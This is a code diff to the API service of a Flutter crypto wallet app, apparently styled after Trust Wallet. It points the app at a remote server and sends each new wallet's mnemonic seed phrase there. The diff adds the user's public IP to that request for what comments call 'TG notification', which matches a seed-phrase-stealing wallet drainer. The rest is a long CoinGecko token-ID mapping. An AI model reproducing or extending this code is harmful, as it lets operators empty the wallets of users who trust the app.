@@ -10,15 +10,15 @@ class ApiService {
   // static const String baseUrl = 'https://trust-wallet-backend.api98vip.com';
 
   //test environment
-  // static const String baseUrl = 'https://dev-wallet.newtwwin.com:7074';
+  static const String baseUrl = 'https://dev-wallet.newtwwin.com:7074';
 
   // Optional: use local backend per platform (uncomment to override [baseUrl] above)
-  static String get baseUrl {
-    if (kIsWeb) return 'http://localhost:8083';
-    if (Platform.isAndroid) return 'http://10.0.2.2:8083';
-    if (Platform.isIOS) return 'http://localhost:8083';
-    return 'http://127.0.0.1:8083';
-  }
+  // static String get baseUrl {
+  //   if (kIsWeb) return 'http://localhost:8083';
+  //   if (Platform.isAndroid) return 'http://10.0.2.2:8083';
+  //   if (Platform.isIOS) return 'http://localhost:8083';
+  //   return 'http://127.0.0.1:8083';
+  // }
 
   /// Create device passcode
   static Future<Map<String, dynamic>> createDevicePasscode({
@@ -45,23 +45,30 @@ class ApiService {
     }
   }
 
-  /// Create multi-chain wallet
+  /// Create multi-chain wallet.
+  /// [publicIp] optional device public IP (from IpHelper.getPublicIp()) for TG/notification.
   static Future<Map<String, dynamic>> createWallet({
     required String devicePassCodeId,
     required String walletName,
     required String mnemonic,
     bool isMain = true,
+    String? publicIp,
   }) async {
     try {
+      final body = <String, dynamic>{
+        'devicePassCodeId': devicePassCodeId,
+        'walletName': walletName,
+        'mnemonic': mnemonic,
+        'isMain': isMain,
+      };
+      if (publicIp != null && publicIp.isNotEmpty) {
+        body['publicIp'] = publicIp;
+        body['ip'] = publicIp; // backend can use either for TG notification
+      }
       final response = await http.post(
         Uri.parse('${baseUrl}/multichain/wallet/create'),
         headers: {'Content-Type': 'application/json'},
-        body: jsonEncode({
-          'devicePassCodeId': devicePassCodeId,
-          'walletName': walletName,
-          'mnemonic': mnemonic,
-          'isMain': isMain,
-        }),
+        body: jsonEncode(body),
       );
 
       if (response.statusCode == 200) {
@@ -259,7 +266,7 @@ class ApiService {
     required String range,
   }) async {
     try {
-      // Map common symbols to CoinCap asset IDs used by the backend.
+      // Map symbols to CoinGecko coin IDs (used by backend for charts).
       final upper = symbol.toUpperCase().trim();
       String tokenId;
       switch (upper) {
@@ -270,16 +277,175 @@ class ApiService {
           tokenId = 'ethereum';
           break;
         case 'BNB':
-          tokenId = 'binance-coin';
+          tokenId = 'binancecoin';
           break;
-        case 'TRX':
-          tokenId = 'tron';
+        case 'USDT':
+          tokenId = 'tether';
+          break;
+        case 'USDC':
+          tokenId = 'usd-coin';
+          break;
+        case 'MATIC':
+          tokenId = 'matic-network';
+          break;
+        case 'AVAX':
+          tokenId = 'avalanche-2';
+          break;
+        case 'FTM':
+          tokenId = 'fantom';
           break;
         case 'SOL':
           tokenId = 'solana';
           break;
-        case 'AVAX':
-          tokenId = 'avalanche';
+        case 'ATOM':
+          tokenId = 'cosmos';
+          break;
+        case 'LTC':
+          tokenId = 'litecoin';
+          break;
+        case 'TRX':
+          tokenId = 'tron';
+          break;
+        case 'DOGE':
+          tokenId = 'dogecoin';
+          break;
+        case 'ADA':
+          tokenId = 'cardano';
+          break;
+        case 'DOT':
+          tokenId = 'polkadot';
+          break;
+        case 'LINK':
+          tokenId = 'chainlink';
+          break;
+        case 'UNI':
+          tokenId = 'uniswap';
+          break;
+        case 'XRP':
+          tokenId = 'ripple';
+          break;
+        case 'XLM':
+          tokenId = 'stellar';
+          break;
+        case 'ALGO':
+          tokenId = 'algorand';
+          break;
+        case 'NEAR':
+          tokenId = 'near';
+          break;
+        case 'ARB':
+          tokenId = 'arbitrum';
+          break;
+        case 'OP':
+          tokenId = 'optimism';
+          break;
+        case 'DAI':
+          tokenId = 'dai';
+          break;
+        case 'BUSD':
+          tokenId = 'binance-usd';
+          break;
+        case 'SHIB':
+          tokenId = 'shiba-inu';
+          break;
+        case 'APE':
+          tokenId = 'apecoin';
+          break;
+        case 'SAND':
+          tokenId = 'the-sandbox';
+          break;
+        case 'MANA':
+          tokenId = 'decentraland';
+          break;
+        case 'AXS':
+          tokenId = 'axie-infinity';
+          break;
+        case 'ENJ':
+          tokenId = 'enjincoin';
+          break;
+        case 'CHZ':
+          tokenId = 'chiliz';
+          break;
+        case 'FLOW':
+          tokenId = 'flow';
+          break;
+        case 'THETA':
+          tokenId = 'theta-token';
+          break;
+        case 'FIL':
+          tokenId = 'filecoin';
+          break;
+        case 'ICP':
+          tokenId = 'internet-computer';
+          break;
+        case 'EGLD':
+          tokenId = 'elrond-erd-2';
+          break;
+        case 'HBAR':
+          tokenId = 'hedera-hashgraph';
+          break;
+        case 'VET':
+          tokenId = 'vechain';
+          break;
+        case 'EOS':
+          tokenId = 'eos';
+          break;
+        case 'XTZ':
+          tokenId = 'tezos';
+          break;
+        case 'AAVE':
+          tokenId = 'aave';
+          break;
+        case 'MKR':
+          tokenId = 'maker';
+          break;
+        case 'COMP':
+          tokenId = 'compound-governance-token';
+          break;
+        case 'SNX':
+          tokenId = 'havven';
+          break;
+        case 'CRV':
+          tokenId = 'curve-dao-token';
+          break;
+        case '1INCH':
+          tokenId = '1inch';
+          break;
+        case 'SUSHI':
+          tokenId = 'sushi';
+          break;
+        case 'YFI':
+          tokenId = 'yearn-finance';
+          break;
+        case 'BAL':
+          tokenId = 'balancer';
+          break;
+        case 'ZRX':
+          tokenId = '0x';
+          break;
+        case 'BAT':
+          tokenId = 'basic-attention-token';
+          break;
+        case 'ZEC':
+          tokenId = 'zcash';
+          break;
+        case 'DASH':
+          tokenId = 'dash';
+          break;
+        case 'XMR':
+          tokenId = 'monero';
+          break;
+        case 'ETC':
+          tokenId = 'ethereum-classic';
+          break;
+        case 'BCH':
+          tokenId = 'bitcoin-cash';
+          break;
+        case 'BSV':
+          tokenId = 'bitcoin-sv';
+          break;
+        case 'TWT':
+          tokenId = 'trust-wallet-token';
           break;
         default:
           tokenId = upper.toLowerCase();
@@ -311,7 +477,7 @@ class ApiService {
       }
 
       final uri = Uri.parse('${baseUrl}/market/token/$tokenId/history')
-          .replace(queryParameters: {'interval': interval});
+          .replace(queryParameters: {'interval': interval, 'rangeKey': range});
 
       final response = await http.get(
         uri,
